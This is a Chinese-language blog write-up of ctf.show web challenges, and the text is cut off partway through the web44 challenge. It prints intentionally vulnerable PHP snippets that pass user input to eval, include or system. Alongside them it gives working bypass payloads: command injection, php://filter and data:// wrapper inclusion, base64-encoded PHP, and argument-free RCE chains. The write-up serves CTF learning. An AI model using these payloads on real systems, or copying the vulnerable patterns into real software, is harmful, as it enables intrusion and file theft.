<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="paixiaoxing">
    
    <title>
        
            ctf-show(爆破-命令执行-php特性-文件上传-sql注入) |
        
        paixiaoxing&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/paidaxing.jpg">
    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/paidaxing.jpg","favicon":"/images/paidaxing.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"“请用绝对的理智压制不该有的情绪。”"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/paidaxing.jpg">
                </a>
            
            <a class="logo-title" href="/">
                paixiaoxing&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                LINKS
                            </a>
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">LINKS</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">ctf-show(爆破-命令执行-php特性-文件上传-sql注入)</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/paidaxing.jpg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">paixiaoxing</span>
                        
                            <span class="author-label">Lv5</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2022-02-22 11:11:39</span>
        <span class="mobile">2022-02-22 11:11</span>
    </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/ctf-show/">ctf-show</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><h3 id="web-28"><a href="#web-28" class="headerlink" title="web 28"></a>web 28</h3><p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web28_1.png" alt="1"></p>
<p>看到题目里面啥也没有，能爆破的地方只有页面上面的url内容</p>
<p>但是如果改txt内容，网页会将我们重定向</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web28_3.png" alt="1"></p>
<p>导致网页访问不了，直接爆破目录/0/1/替换用bp</p>
<p>最后结果是/72/20/</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只屏蔽了flag</p>
<p>payload：</p>
<p><code>?c= system(&quot;cat fla*&quot;);</code></p>
<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat fla*`;</span><br></pre></td></tr></table></figure>

<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag system php cat sort shell . 空格  &#x27;</span><br></pre></td></tr></table></figure>

<p>空格过滤，可以用table绕过%09进行绕过</p>
<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<p><code>flag system php cat sort shell . 空格 &#39; 反撇 echo ; (</code></p>
<p>但是没过滤include可以包含一个post参数然后用伪协议来读取</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag system php cat sort shell . &#x27; ` echo ; ( &quot;</span><br></pre></td></tr></table></figure>

<p>相比较上一题多过滤了一个双引号，可以post包数字就不需要双引号</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">？c=include$_POST[1]?&gt;</span><br><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了一个:好像没什么影响</p>
<p>用上面的payload一样打</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又过滤了&lt;还有=</p>
<p>毫无影响</p>
<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又过滤了数字那么之前的方法行不通了</p>
<p>可以把数字直接替换成字母，虽然规范要添加引号包含住，但是不写也可以执行</p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件包含漏洞，可以直接文件包含代码执行：<code>data:text/plain,&lt;?php 你想要执行的代码?&gt;</code></p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?php echo `cat fla*`?&gt;</span><br></pre></td></tr></table></figure>

<p>flag在源代码里</p>
<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了php还有file，</p>
<p>上面的payload不能用了，我们可以把后面的内容进行一个base64编码进行执行</p>
<p>payload</p>
<p><code>?c=data:text/plain;base64,PD9waHAgZWNobyBgY2F0IGZsYSpgPz4=</code></p>
<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题的意思就是直接在我们的最后添加一个.php</p>
<p>我们可以直接使用上面的代码执行，执行结束之后直接添加.php也不影响执行</p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数字 ~ @ # \$ % ^ &amp; * ( ) - + = &#123; &#125; [ ] &#x27; &quot; , &lt; . &gt; ? / \</span><br></pre></td></tr></table></figure>

<p>这里的屏蔽的是中文括号，也就是说我们只能用无参RCE</p>
<p>我们想要查看目录可以用print_r(scandir(‘.’))</p>
<p>既然是无参最难的就是构造”.”</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">他是一个数组，第一个就是.我们需要调用数组的第一个又需要介绍一个函数</span><br><span class="line">current（）</span><br><span class="line">他们俩组合current(locakeconv())</span><br><span class="line">就可以调用‘.’拉</span><br><span class="line">可以用print_r(scandir(current(locakeconv())));</span><br><span class="line">查看目录文件</span><br><span class="line">然后用</span><br><span class="line">array_reverse()</span><br><span class="line">next（）</span><br><span class="line">倒置，取下一个，取到我们想要的文件</span><br></pre></td></tr></table></figure>

<p>然后highlight_file就行</p>
<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0-9 a-z ^ + ~ $ [ ] &#123; &#125; &amp; - </span><br></pre></td></tr></table></figure>









<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接运行就行，用分号隔断</p>
<p>payload：<code>?c=cat flag.php;</code></p>
<h3 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了分号隔断</p>
<p>可以使用||这个符号的作用就是左边执行的话右边不执行</p>
<h3 id="web-44"><a href="#web-44" class="headerlink" title="web 44"></a>web 44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span 